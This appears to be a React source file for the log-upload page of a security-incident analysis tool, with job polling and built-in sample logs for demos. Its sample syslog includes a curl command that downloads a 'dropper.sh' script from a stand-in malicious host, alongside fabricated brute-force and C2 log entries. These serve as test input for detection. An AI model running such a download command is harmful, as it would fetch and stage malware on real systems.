import {useCallback, useEffect, useMemo, useRef, useState} from "react";
import {useNavigate} from "react-router-dom";
import {api, apiErrorMessage} from "../lib/api";
import {toast} from "sonner";
import {
    Archive,
    ArrowClockwise,
    ClipboardText,
    FileArrowUp,
    Files,
    Funnel,
    WarningCircle,
    X,
} from "@phosphor-icons/react";
import {PageHeader} from "../design-system";
import {HelpTip, Tip} from "../components/HelpTip";

const STEPS = [
    ["queued", "Queued"],
    ["parsing", "Parsing"],
    ["extracting", "Extracting"],
    ["correlating", "Correlating"],
    ["enriching", "Enriching"],
    ["generating", "Playbook"],
    ["done", "Complete"],
];

/** Formats the pipeline auto-detects (honest product claim — not every SIEM format). */
const SUPPORTED_FORMATS = [
    "apache", "nginx", "syslog", "json", "csv", "cef", "leef",
    "cloudtrail", "suricata", "zeek", "sysmon", "defender", "evtx*", "zip",
];

const SAMPLE_APACHE = `45.155.205.199 - - [01/Feb/2026:09:12:44 +0000] "GET /wp-admin HTTP/1.1" 403 512
45.155.205.199 - - [01/Feb/2026:09:12:47 +0000] "POST /wp-login.php HTTP/1.1" 401 234
45.155.205.199 - - [01/Feb/2026:09:12:50 +0000] "POST /wp-login.php HTTP/1.1" 200 8912
`;
const SAMPLE_SYSLOG = `Feb  1 09:13:02 web01 sshd[2211]: Failed password for root from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:05 web01 sshd[2211]: Failed password for admin from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:44 web01 bash[3120]: /usr/bin/curl -sSL http://malicious-hive.top/dropper.sh -o /tmp/x.sh
Feb  1 09:14:10 web01 kernel: outbound connection to 185.220.101.44:4444 CVE-2021-44228
`;
const SAMPLE_CSV = `timestamp,action,src_ip,dst_ip,dst_port,protocol
2026-02-01T09:14:10,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:14:12,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:15:00,ALLOW,10.0.0.5,185.220.101.44,443,tcp
`;
const SAMPLE_SSH = `Jan 15 10:01:02 bastion sshd[1201]: Failed password for root from 203.0.113.10 port 51222 ssh2
Jan 15 10:01:05 bastion sshd[1202]: Failed password for admin from 203.0.113.10 port 51224 ssh2
Jan 15 10:01:09 bastion sshd[1203]: Failed password for ubuntu from 203.0.113.10 port 51230 ssh2
Jan 15 10:02:11 bastion sshd[1210]: Failed password for root from 203.0.113.10 port 51301 ssh2
Jan 15 10:03:44 bastion sshd[1222]: Accepted password for deploy from 203.0.113.10 port 52011 ssh2
`;
const SAMPLE_SURICATA = `{"timestamp":"2026-02-01T09:15:01.000000+0000","event_type":"alert","src_ip":"45.155.205.199","dest_ip":"10.0.0.5","dest_port":4444,"proto":"TCP","alert":{"signature":"ET TROJAN Possible C2","category":"A Network Trojan was Detected","severity":1}}
{"timestamp":"2026-02-01T09:15:02.000000+0000","event_type":"alert","src_ip":"45.155.205.199","dest_ip":"10.0.0.5","dest_port":4444,"proto":"TCP","alert":{"signature":"ET SCAN Potential SSH Scan","category":"Attempted Information Leak","severity":2}}
`;

const SAMPLE_TEMPLATES = [
    {id: "bundle", label: "3-file IR bundle", kind: "bundle"},
    {id: "apache", label: "Apache access", kind: "file", name: "apache.log", content: SAMPLE_APACHE},
    {id: "syslog", label: "Syslog (dropper)", kind: "file", name: "syslog.log", content: SAMPLE_SYSLOG},
    {id: "ssh", label: "SSH brute force", kind: "file", name: "ssh_bruteforce.log", content: SAMPLE_SSH},
    {id: "csv", label: "Firewall CSV", kind: "file", name: "firewall.csv", content: SAMPLE_CSV, type: "text/csv"},
    {id: "suricata", label: "Suricata EVE JSON", kind: "file", name: "suricata_eve.json", content: SAMPLE_SURICATA, type: "application/json"},
];

const JOB_FILTERS = [
    {id: "all", label: "All"},
    {id: "active", label: "Active"},
    {id: "done", label: "Done"},
    {id: "failed", label: "Failed"},
];

const MAX_FILE_SIZE_BYTES = 25 * 1024 * 1024; // 25 MB limit per file
const ACCEPT_ATTR = ".log,.txt,.json,.jsonl,.csv,.zip,.gz,.cef,.evtx,text/plain,application/json,text/csv,application/zip";

function fmtSize(n) {
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

function makeFile(name, content, type = "text/plain") {
    return new File([new Blob([content], {type})], name, {type});
}

function jobMatchesFilter(job, filter) {
    if (filter === "all") return true;
    if (filter === "done") return job.status === "done";
    if (filter === "failed") return job.status === "failed";
    if (filter === "active") return job.status !== "done" && job.status !== "failed";
    return true;
}

export default function Upload() {
    const [jobs, setJobs] = useState([]);
    const [queue, setQueue] = useState([]); // pending files
    const [dragOver, setDragOver] = useState(false);
    const [uploading, setUploading] = useState(false);
    const [jobFilter, setJobFilter] = useState("all");
    const [pasteOpen, setPasteOpen] = useState(false);
    const [pasteName, setPasteName] = useState("pasted.log");
    const [pasteBody, setPasteBody] = useState("");
    const inputRef = useRef(null);
    const nav = useNavigate();
    const prevStatusRef = useRef({});

    const refresh = useCallback(
        () =>
            api
                .get("/logs/jobs", {silentError: true})
                .then((r) => {
                    const next = Array.isArray(r.data) ? r.data : [];
                    const prev = prevStatusRef.current || {};
                    next.forEach((j) => {
                        if (!j?.id) return;
                        const was = prev[j.id];
                        if (j.status === "failed" && was && was !== "failed") {
                            toast.error(`Pipeline failed: ${j.filename || j.id.slice(0, 8)}`, {
                                description: j.error || "See job details for the error message.",
                                duration: 9000,
                                id: `job-fail-${j.id}`,
                            });
                        }
                        if (j.status === "done" && was && was !== "done" && was !== "failed") {
                            toast.success(`Pipeline complete: ${j.filename || j.id.slice(0, 8)}`, {
                                id: `job-done-${j.id}`,
                            });
                        }
                    });
                    const map = {};
                    next.forEach((j) => {
                        if (j?.id) map[j.id] = j.status;
                    });
                    prevStatusRef.current = map;
                    setJobs(next);
                })
                .catch(() => {
                    // Keep existing list on transient poll failures
                }),
        [],
    );

    useEffect(() => {
        refresh();
        const t = setInterval(refresh, 3000);
        return () => clearInterval(t);
    }, [refresh]);

    const addFiles = useCallback((fs) => {
        const arr = Array.from(fs || []);
        const validFiles = arr.filter((f) => {
            if (f.size > MAX_FILE_SIZE_BYTES) {
                toast.error(`File "${f.name}" exceeds the 25 MB limit and was skipped.`);
                return false;
            }
            return true;
        });

        setQueue((prev) => {
            const combined = [...prev, ...validFiles];
            if (combined.length > 20) {
                toast.warning("Maximum queue limit is 20 files. Truncated excess selections.");
            }
            return combined.slice(0, 20);
        });
    }, []);

    const removeQueued = (idx) => setQueue((q) => q.filter((_, i) => i !== idx));

    const resumeJob = useCallback(
        async (jobId) => {
            try {
                await api.post(`/logs/jobs/${jobId}/resume`);
                toast.success("Job re-queued — pipeline will resume shortly");
                refresh();
            } catch (e) {
                toast.error(e?.userMessage || apiErrorMessage(e, "Could not resume job"));
            }
        },
        [refresh],
    );

    const replayJob = useCallback(
        async (jobId) => {
            try {
                const r = await api.post(`/logs/jobs/${jobId}/replay`);
                if (r.data?.ok && r.data?.mode === "requeue") {
                    toast.success("Replay re-queued — worker will run the pipeline again");
                } else if (r.data?.mode === "artifact_only") {
                    toast.message(
                        r.data?.message ||
                            "No upload payload retained — open artifacts or re-upload logs",
                    );
                } else {
                    toast.success(r.data?.message || "Replay requested");
                }
                refresh();
            } catch (e) {
                toast.error(e?.userMessage || apiErrorMessage(e, "Could not replay job"));
            }
        },
        [refresh],
    );

    const showArtifacts = useCallback(async (jobId) => {
        try {
            const r = await api.get(`/logs/jobs/${jobId}/artifacts`);
            const names = r.data?.artifacts || [];
            if (!names.length) {
                toast.message(
                    "No artifacts yet — set JOB_ARTIFACTS_ENABLED=1 and re-run the pipeline",
                );
                return;
            }
            toast.success(`Artifacts: ${names.join(", ")}`);
        } catch (e) {
            toast.error(e?.userMessage || apiErrorMessage(e, "Could not list artifacts"));
        }
    }, []);

    const submit = useCallback(async () => {
        if (queue.length === 0) return;
        setUploading(true);
        const fd = new FormData();
        queue.forEach((f) => fd.append("files", f));
        try {
            const r = await api.post("/logs/upload-batch", fd, {
                headers: {"Content-Type": "multipart/form-data"},
            });
            toast.success(`Uploaded ${queue.length} file(s) — pipeline running (${r.data.mode} mode)`);
            setQueue([]);
            refresh();
        } catch (e) {
            toast.error(e?.userMessage || apiErrorMessage(e, "Upload failed"));
        } finally {
            setUploading(false);
        }
    }, [queue, refresh]);

    const stageTemplate = useCallback((templateId) => {
        const t = SAMPLE_TEMPLATES.find((x) => x.id === templateId);
        if (!t) return;
        if (t.kind === "bundle") {
            setQueue([
                makeFile("apache.log", SAMPLE_APACHE),
                makeFile("syslog.log", SAMPLE_SYSLOG),
                makeFile("firewall.csv", SAMPLE_CSV, "text/csv"),
            ]);
            toast.info("3-file incident bundle staged — click Run pipeline");
            return;
        }
        const file = makeFile(t.name, t.content, t.type || "text/plain");
        setQueue((prev) => {
            const next = [...prev, file].slice(0, 20);
            return next;
        });
        toast.info(`Staged ${t.name} — click Run pipeline when ready`);
    }, []);

    const stagePaste = useCallback(() => {
        const body = pasteBody.trim();
        if (!body) {
            toast.error("Paste some log text first");
            return;
        }
        const name = (pasteName || "pasted.log").trim() || "pasted.log";
        const file = makeFile(name, body + (body.endsWith("\n") ? "" : "\n"));
        if (file.size > MAX_FILE_SIZE_BYTES) {
            toast.error("Pasted content exceeds the 25 MB limit");
            return;
        }
        setQueue((prev) => [...prev, file].slice(0, 20));
        setPasteBody("");
        toast.success(`Staged ${name} from paste`);
    }, [pasteBody, pasteName]);

    const totalQueueSize = useMemo(() => queue.reduce((acc, f) => acc + f.size, 0), [queue]);
    const filteredJobs = useMemo(
        () => jobs.filter((j) => jobMatchesFilter(j, jobFilter)),
        [jobs, jobFilter],
    );
    const jobCounts = useMemo(() => {
        const c = {all: jobs.length, active: 0, done: 0, failed: 0};
        for (const j of jobs) {
            if (j.status === "done") c.done += 1;
            else if (j.status === "failed") c.failed += 1;
            else c.active += 1;
        }
        return c;
    }, [jobs]);

    return (
        <div data-testid="upload-page" className="space-y-6">
            <PageHeader
                testid="upload-header"
                title="Ingest Logs"
                icon={FileArrowUp}
                subtitle="Drop logs, multi-file packages, or ZIPs. Format is auto-detected; events normalize to CES and correlate into one incident per job (not multi-tenant SIEM fan-out)."
                tip={
                    <HelpTip
                        title="Log ingest"
                        body="Upload evidence packages. Multi-file ZIPs are expanded safely (zip-bomb limits). Events normalize into CES, correlate into one incident, then run IoC → TI → ATT&CK → playbook."
                        how="POST /logs/upload-batch (multipart). Jobs poll via GET /logs/jobs. API stream ingest: POST /logs/ingest (+ optional X-Ingest-Key)."
                        testid="tip-upload-page"
                    />
                }
                actions={
                    <div className="flex flex-wrap items-center gap-2">
                        <label className="sr-only" htmlFor="sample-template">Sample template</label>
                        <select
                            id="sample-template"
                            data-testid="sample-template-select"
                            className="soc-btn-secondary !text-xs !h-9 !py-0 max-w-[11rem]"
                            defaultValue=""
                            onChange={(e) => {
                                const v = e.target.value;
                                if (v) stageTemplate(v);
                                e.target.value = "";
                            }}
                        >
                            <option value="" disabled>
                                Stage sample…
                            </option>
                            {SAMPLE_TEMPLATES.map((t) => (
                                <option key={t.id} value={t.id}>{t.label}</option>
                            ))}
                        </select>
                        <button
                            type="button"
                            onClick={() => stageTemplate("bundle")}
                            className="soc-btn-secondary !text-xs !h-9 inline-flex items-center gap-1.5"
                            data-testid="load-sample-bundle-header"
                        >
                            <Files size={14}/>
                            3-file bundle
                        </button>
                        <button
                            type="button"
                            onClick={() => setPasteOpen((v) => !v)}
                            className="soc-btn-secondary !text-xs !h-9 inline-flex items-center gap-1.5"
                            data-testid="paste-log-toggle"
                            aria-expanded={pasteOpen}
                        >
                            <ClipboardText size={14}/>
                            Paste log
                        </button>
                        <button
                            type="button"
                            onClick={refresh}
                            className="soc-btn-secondary !text-xs !h-9 inline-flex items-center gap-1.5"
                            data-testid="refresh-jobs-btn"
                            title="Refresh job status list"
                        >
                            <ArrowClockwise size={14}/>
                            Refresh
                        </button>
                    </div>
                }
            />

            <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
                <div className="lg:col-span-2 space-y-4">
                    <div
                        data-testid="drop-zone"
                        onDragOver={(e) => {
                            e.preventDefault();
                            setDragOver(true);
                        }}
                        onDragLeave={() => setDragOver(false)}
                        onDrop={(e) => {
                            e.preventDefault();
                            setDragOver(false);
                            addFiles(e.dataTransfer.files);
                        }}
                        onClick={() => inputRef.current?.click()}
                        className={`soc-card p-8 border-dashed cursor-pointer transition-colors relative overflow-hidden ${
                            dragOver ? "border-primary/80 bg-primary/10 shadow-lg" : "hover:border-primary/40"
                        }`}
                    >
                        <input
                            type="file"
                            multiple
                            ref={inputRef}
                            className="hidden"
                            data-testid="file-input"
                            accept={ACCEPT_ATTR}
                            onChange={(e) => {
                                addFiles(e.target.files);
                                e.target.value = "";
                            }}
                        />
                        <div className="flex items-start gap-3">
                            <FileArrowUp size={36} className="text-primary shrink-0 animate-bounce"/>
                            <div>
                                <div className="font-semibold text-lg leading-tight">
                                    Drop logs or a ZIP package
                                </div>
                                <div className="text-xs text-muted-foreground mt-1">
                                    Single file, multi-file, or incident-package ZIP · max 20 files · 25 MB each
                                </div>
                            </div>
                        </div>
                        <div
                            className="mt-5 flex flex-wrap items-center gap-1.5 text-[10px] uppercase tracking-[0.12em] text-muted-foreground"
                            data-testid="supported-formats"
                        >
                            {SUPPORTED_FORMATS.map((f) => (
                                <Tip
                                    key={f}
                                    content={
                                        f === "evtx*"
                                            ? "Windows EVTX: magic detect + optional python-evtx scaffold (not full Windows log coverage)."
                                            : `Auto-detect confidence scoring for ${f}`
                                    }
                                >
                                    <span className="px-2 py-0.5 rounded border border-border bg-background cursor-help">
                                        {f}
                                    </span>
                                </Tip>
                            ))}
                        </div>
                    </div>

                    {pasteOpen && (
                        <div className="soc-card p-4 space-y-3" data-testid="paste-log-panel">
                            <div className="flex items-center justify-between gap-2">
                                <div className="soc-label inline-flex items-center gap-1.5">
                                    Paste log text
                                    <HelpTip
                                        title="Paste to stage"
                                        body="Stage ad-hoc log text without saving a file on disk. Filename extension can help detection (e.g. .json, .csv, .log)."
                                        testid="tip-paste-log"
                                    />
                                </div>
                                <button
                                    type="button"
                                    className="text-[11px] text-muted-foreground hover:text-foreground"
                                    onClick={() => setPasteOpen(false)}
                                >
                                    Close
                                </button>
                            </div>
                            <div className="flex flex-wrap gap-2 items-center">
                                <label className="text-[11px] text-muted-foreground" htmlFor="paste-filename">
                                    Filename
                                </label>
                                <input
                                    id="paste-filename"
                                    data-testid="paste-filename"
                                    className="soc-mono text-xs px-2 py-1.5 rounded border border-border bg-background min-w-[10rem]"
                                    value={pasteName}
                                    onChange={(e) => setPasteName(e.target.value)}
                                    placeholder="pasted.log"
                                />
                            </div>
                            <textarea
                                data-testid="paste-log-body"
                                className="w-full min-h-[120px] text-xs font-mono rounded-lg border border-border bg-background p-3 resize-y"
                                placeholder="Paste Apache, syslog, Suricata JSONL, CSV…"
                                value={pasteBody}
                                onChange={(e) => setPasteBody(e.target.value)}
                            />
                            <div className="flex justify-end">
                                <button
                                    type="button"
                                    data-testid="paste-stage-btn"
                                    onClick={stagePaste}
                                    className="text-xs px-3.5 py-1.5 bg-primary text-primary-foreground font-semibold rounded"
                                >
                                    Stage paste →
                                </button>
                            </div>
                        </div>
                    )}

                    {queue.length > 0 && (
                        <div className="soc-card p-4 border-primary/30 bg-primary/[0.02]">
                            <div className="flex items-center justify-between mb-3">
                                <div>
                                    <div className="soc-label inline-flex items-center gap-1.5">
                                        Staged Files ({queue.length}/20)
                                        <HelpTip
                                            title="Staged files"
                                            body="Client-side queue before upload. Max 20 files / 25 MB each. ZIP packages expand server-side with zip-bomb limits."
                                            testid="tip-upload-staged"
                                        />
                                    </div>
                                    <div className="text-[10px] text-muted-foreground font-mono mt-0.5">
                                        Total payload: {fmtSize(totalQueueSize)}
                                    </div>
                                </div>
                                <div className="flex items-center gap-2">
                                    <button
                                        data-testid="clear-queue"
                                        onClick={() => setQueue([])}
                                        className="text-[11px] text-muted-foreground hover:text-error transition-colors px-2 py-1 rounded"
                                    >
                                        Clear all
                                    </button>
                                    <button
                                        data-testid="submit-batch"
                                        onClick={submit}
                                        disabled={uploading}
                                        className="text-xs px-3.5 py-1.5 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold rounded transition-colors disabled:opacity-50 inline-flex items-center gap-1.5 shadow-sm"
                                    >
                                        {uploading ? (
                                            <>
                                                <span
                                                    className="w-3 h-3 border-2 border-primary-foreground border-t-transparent rounded-full animate-spin"/>
                                                Uploading…
                                            </>
                                        ) : (
                                            "Run pipeline →"
                                        )}
                                    </button>
                                </div>
                            </div>
                            <div className="space-y-1.5 max-h-56 overflow-y-auto pr-1">
                                {queue.map((f, i) => (
                                    <div key={`${f.name}-${i}`}
                                         className="flex items-center justify-between text-[12px] px-2.5 py-1.5 bg-background rounded border border-border"
                                         data-testid={`staged-${i}`}>
                                        <div className="flex items-center gap-2 min-w-0">
                                            {f.name.endsWith(".zip") ?
                                                <Archive size={14} className="text-warning shrink-0"/> :
                                                <Files size={14} className="text-primary shrink-0"/>}
                                            <span className="soc-mono truncate font-medium">{f.name}</span>
                                        </div>
                                        <div className="flex items-center gap-3 shrink-0">
                                            <span
                                                className="text-muted-foreground font-mono text-[10px]">{fmtSize(f.size)}</span>
                                            <button onClick={() => removeQueued(i)}
                                                    className="text-muted-foreground hover:text-error transition-colors p-1"
                                                    title="Remove file">
                                                <X size={12}/>
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}

                    <div className="soc-card p-4 text-xs text-muted-foreground leading-relaxed">
                        <div className="soc-label mb-2 text-foreground inline-flex items-center gap-1.5">
                            Pipeline Execution Flow
                            <HelpTip
                                title="Pipeline stages"
                                body="What happens after Run pipeline: normalize → correlate → enrich IoCs → ATT&CK → playbook → HiTL routing. Timings appear under Ops Health."
                                testid="tip-upload-pipeline"
                            />
                        </div>
                        <ol className="space-y-1.5 font-mono text-[11px]">
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">1.</span> Format detection per file → CES
                                normalization
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">2.</span> Cross-log correlation (IP · user · host ·
                                hash · domain)
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">3.</span> IoC extraction + parallel threat-intel
                                enrichment
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">4.</span> MITRE ATT&CK technique inference
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">5.</span> Citation-grounded playbook via LLM
                            </li>
                            <li className="flex items-center gap-2"><span
                                className="text-primary font-bold">6.</span> HiTL routing on critical severity / low
                                grounding
                            </li>
                        </ol>
                    </div>
                </div>

                <div className="lg:col-span-3 soc-card p-0 overflow-hidden">
                    <div className="px-4 py-3 border-b border-border flex flex-wrap items-center justify-between gap-2 bg-muted/20">
                        <div className="soc-label inline-flex items-center gap-1.5">
                            Recent Jobs Queue
                            <HelpTip
                                title="Job queue"
                                body="Async ingest jobs for this tenant: queued → running → done/failed. Open the incident when done. Retry only if durable payload still exists."
                                how="GET /logs/jobs (or jobs list) · polled ~3s while this page is open."
                                testid="tip-upload-jobs"
                            />
                        </div>
                        <div className="flex flex-wrap items-center gap-2">
                            <div
                                className="flex items-center gap-1"
                                data-testid="job-filter-bar"
                                role="group"
                                aria-label="Filter jobs"
                            >
                                <Funnel size={12} className="text-muted-foreground" aria-hidden/>
                                {JOB_FILTERS.map((f) => (
                                    <button
                                        key={f.id}
                                        type="button"
                                        data-testid={`job-filter-${f.id}`}
                                        onClick={() => setJobFilter(f.id)}
                                        className={`text-[10px] uppercase tracking-wider font-semibold px-2 py-0.5 rounded border transition-colors ${
                                            jobFilter === f.id
                                                ? "border-primary/40 bg-primary/10 text-primary"
                                                : "border-border text-muted-foreground hover:text-foreground"
                                        }`}
                                    >
                                        {f.label}
                                        <span className="ml-1 font-mono opacity-70">{jobCounts[f.id] ?? 0}</span>
                                    </button>
                                ))}
                            </div>
                            <div className="text-[10px] text-muted-foreground font-mono">auto-refresh · 3s</div>
                        </div>
                    </div>
                    <div className="divide-y divide-border">
                        {jobs.length === 0 && (
                            <div className="text-center text-muted-foreground text-xs py-14 space-y-2">
                                <Files size={32} className="mx-auto opacity-40 text-muted-foreground"/>
                                <div>No ingestion jobs recorded yet</div>
                                <div className="text-[11px] text-muted-foreground/80">
                                    Drop files, paste a log, or stage a sample template to start.
                                </div>
                            </div>
                        )}
                        {jobs.length > 0 && filteredJobs.length === 0 && (
                            <div
                                className="text-center text-muted-foreground text-xs py-10"
                                data-testid="jobs-filter-empty"
                            >
                                No jobs match filter “{jobFilter}”.
                            </div>
                        )}
                        {filteredJobs.map((j) => {
                            const idx = STEPS.findIndex(([k]) => k === j.status);
                            const isFail = j.status === "failed";
                            const canResume =
                                isFail ||
                                (j.status !== "done" &&
                                    (j.queue_state === "running" ||
                                        j.error ||
                                        (j.status !== "queued" && j.progress != null && j.progress < 100)));
                            return (
                                <div key={j.id} className="p-4 hover:bg-muted/[0.03] transition-colors">
                                    <div className="flex items-center justify-between mb-2">
                                        <div className="min-w-0">
                                            <div className="flex items-center gap-2">
                                                {j.mode === "zip" ?
                                                    <Archive size={14} className="text-warning shrink-0"/> :
                                                    j.mode === "batch" ?
                                                        <Files size={14} className="text-primary shrink-0"/> : null}
                                                <div
                                                    className="text-sm font-medium text-foreground truncate">{j.filename}</div>
                                                <span
                                                    className="text-[9px] uppercase tracking-[0.14em] px-1.5 py-0.5 rounded bg-muted text-muted-foreground font-mono">
                          {j.mode || "single"}
                        </span>
                                            </div>
                                            <div
                                                className="soc-mono text-[10px] text-muted-foreground mt-0.5 flex items-center gap-2">
                                                <span>ID: {j.id.slice(0, 8)}</span>
                                                <span>·</span>
                                                <span>{fmtSize(j.size)}</span>
                                                {j.files && j.files.length > 1 && (
                                                    <>
                                                        <span>·</span>
                                                        <span>{j.files.length} files</span>
                                                    </>
                                                )}
                                            </div>
                                        </div>
                                        <div className="flex items-center gap-2">
                                            {j.status === "done" && j.incident_ids?.[0] && (
                                                <button
                                                    data-testid={`job-view-${j.id}`}
                                                    onClick={() => nav(`/incidents/${j.incident_ids[0]}`)}
                                                    className="text-[11px] px-2.5 py-1 bg-success-soft border border-[var(--success-border)] text-success rounded hover:brightness-95 transition-colors font-medium"
                                                >
                                                    Open incident →
                                                </button>
                                            )}
                                            {canResume && j.status !== "done" && (
                                                <button
                                                    type="button"
                                                    data-testid={`job-resume-${j.id}`}
                                                    onClick={() => resumeJob(j.id)}
                                                    className="text-[11px] px-2.5 py-1 bg-amber-500/10 border border-amber-500/40 text-amber-200 rounded hover:bg-amber-500/20 transition-colors font-medium"
                                                    title="Re-queue this job if the durable payload still exists"
                                                >
                                                    Resume
                                                </button>
                                            )}
                                            <button
                                                type="button"
                                                data-testid={`job-replay-${j.id}`}
                                                onClick={() => replayJob(j.id)}
                                                className="text-[11px] px-2.5 py-1 bg-primary/10 border border-primary/30 text-primary rounded hover:bg-primary/20 transition-colors font-medium"
                                                title="Full pipeline replay when JOB_PAYLOAD_RETAIN kept the upload"
                                            >
                                                Replay
                                            </button>
                                            <button
                                                type="button"
                                                data-testid={`job-artifacts-${j.id}`}
                                                onClick={() => showArtifacts(j.id)}
                                                className="text-[11px] px-2.5 py-1 border border-border text-muted-foreground rounded hover:bg-muted/40 transition-colors font-medium"
                                                title="List captured stage artifacts (if JOB_ARTIFACTS_ENABLED)"
                                            >
                                                Artifacts
                                            </button>
                                            <span
                                                data-testid={`job-status-${j.id}`}
                                                className={`text-[10px] uppercase tracking-[0.14em] font-semibold px-2 py-0.5 rounded ${
                                                    isFail ? "bg-error-soft text-error border border-[var(--error-border)]" :
                                                        j.status === "done" ? "bg-success-soft text-success border border-[var(--success-border)]" :
                                                            "bg-primary/10 text-primary border border-primary/20"
                                                }`}
                                            >
                        {j.status}
                      </span>
                                            {(j.pipeline_total_ms != null || j.stage_timings?.total_ms != null) && (
                                                <span
                                                    data-testid={`job-timing-${j.id}`}
                                                    className="text-[10px] font-mono text-muted-foreground"
                                                    title={
                                                        j.stage_timings?.by_stage_ms
                                                            ? Object.entries(j.stage_timings.by_stage_ms)
                                                                .map(([k, v]) => `${k}: ${v}ms`)
                                                                .join(" · ")
                                                            : "Pipeline wall-clock time"
                                                    }
                                                >
                                                    {Number(j.pipeline_total_ms ?? j.stage_timings?.total_ms).toFixed(0)}ms
                                                </span>
                                            )}
                                        </div>
                                    </div>

                                    {j.files_meta?.length > 0 && (
                                        <div className="grid grid-cols-2 gap-1.5 mb-3">
                                            {j.files_meta.map((m) => (
                                                <div key={m.file}
                                                     className="text-[10px] flex items-center justify-between px-2.5 py-1 rounded bg-background border border-border">
                                                    <span
                                                        className="soc-mono truncate font-medium">{m.file.split("/").pop()}</span>
                                                    <span className="text-primary font-mono">
                            <span className="text-muted-foreground">{m.format}</span> · {m.events} evt
                          </span>
                                                </div>
                                            ))}
                                        </div>
                                    )}

                                    <div className="grid grid-cols-7 gap-1 mt-3">
                                        {STEPS.map(([k, label], i) => {
                                            const active = idx >= i && !isFail;
                                            const current = idx === i && !isFail && k !== "done";
                                            return (
                                                <div key={k} className="flex flex-col items-center gap-1">
                                                    <div
                                                        className={`h-1.5 w-full rounded-full transition-all duration-300 ${
                                                            isFail ? "bg-[var(--error)]/40" :
                                                                active ? "bg-primary" : "bg-muted"
                                                        } ${current ? "animate-pulse ring-2 ring-primary/20" : ""}`}/>
                                                    <div
                                                        className={`text-[9px] tracking-wider uppercase font-mono ${active ? "text-primary font-semibold" : "text-muted-foreground/70"}`}>
                                                        {label}
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                    {j.error && (
                                        <div
                                            className="mt-2.5 text-[11px] text-error bg-error-soft p-2 rounded border border-[var(--error-border)] flex items-start gap-1.5">
                                            <WarningCircle size={14} className="shrink-0 mt-0.5"/>
                                            <span className="font-mono break-all">Error: {j.error}</span>
                                        </div>
                                    )}
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
}